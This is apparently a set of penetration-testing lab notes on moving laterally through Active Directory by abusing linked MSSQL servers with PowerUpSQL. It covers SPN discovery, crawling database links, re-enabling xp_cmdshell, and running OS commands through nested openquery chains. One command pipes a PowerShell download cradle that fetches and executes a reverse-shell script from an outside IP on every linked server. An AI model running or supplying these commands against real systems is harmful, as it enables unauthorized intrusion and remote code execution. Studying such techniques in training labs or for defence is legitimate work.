# AD - MSSQL

## MSSQL Server - Data

### Description

* SQL Servers provide very good options for laterla movement as domain users can be mapped to databse roles
* Database Links allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources
* In case of databse Links between SQL Servers => linked SQL Servers - it is possible to execute stored procedures
* Database links work even accros forest/domain trusts - nothing limits it

### Requirement

* SPN and active SQL Server

### Tool

* PowerUpSQL [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

**Discovery (SPN Scanning)**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Import-module .\PowerUpSQL.ps1
</strong><strong>Get-SQLInstanceDomain
</strong>
//Gets all SPNs which start with MSSQL - maybe no SQL Server is running (anymore)
</code></pre>

**Check Accessibility**

```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
```

**Gather Informatione**

```powershell
Get-SqlInstanceDomain | Get-SQLServerInfor -verbose
```

**Search for database Links**

<pre class="language-powershell"><code class="lang-powershell"><strong>Get-SQLServerLink -Instance hostname_of_mssql_server -verbose
</strong>  On all sqlinstances from above
<strong>❗Get-SQLServerLinkCrawl -Instance hostname_of_mssql_server -verbose
</strong>
-or-

select * from master..sysservers 
//do it in HeidiSQL Portable / Hostname of mssqlserver &#x26; Windows Auth
</code></pre>

**Enumerating DB Links manually**

{% code overflow="wrap" %}
```sql
select * from openquery("nextHost",'select * from master.sysservers')
select * from openquery(""nextHost",'select * from openquery("nexNextHost","select * from master.sysservers")')
```
{% endcode %}

**Executing commands**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'whoami'"
</strong><strong>
</strong>Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'powershell download cradle"

❗Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.48/Invoke-PowerShellTcpEx.ps1)"'''
<strong>
</strong>//this runs accross all links
=> only for eu-sql we get an output
</code></pre>

**Executing Commands**\
****Target server should have xp\_cmdshell or rpcout (disabled by default)

* If rpcout is enalbed, you can enable xp\_cmdshell using\
  EXECUTE('sp\_configure "xp\_cmdshell",1;reconfigure;') AT "link-name"
* Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp\_cmdshell on every link of the chain)&#x20;

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql

From the initial SQL Server, OS commands can be executed using nested link queries:
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select
@@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```
{% endcode %}

